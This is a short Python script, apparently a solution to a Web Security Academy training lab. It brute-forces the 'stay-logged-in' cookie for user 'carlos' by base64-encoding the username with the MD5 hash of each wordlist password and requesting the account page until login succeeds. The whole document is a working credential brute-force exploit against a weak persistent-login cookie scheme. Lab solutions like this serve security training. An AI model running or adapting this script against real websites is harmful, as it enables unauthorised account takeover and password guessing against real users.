import requests
import base64
import hashlib

target = "https://ac561f931fec1904c077599b005e005e.web-security-academy.net/my-account"
session_id = "zKslwild2cy7iC8u6NwSMJMG0u9qQr4A"

pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]

def crack():
    for p in passwords:
        print(f'TESTING: {p}')
        stay_logged_in_cookie = base64.b64encode(("carlos:" + hashlib.md5(p.encode()).hexdigest()).encode()).decode()
        cookie = {'session': session_id, 'stay-logged-in': stay_logged_in_cookie}
        response = requests.get(target, cookies=cookie)
        print(response.history)
        if 'Update email' in response.text:
            print(f'FOUND PASS: {p}')
            break



crack()
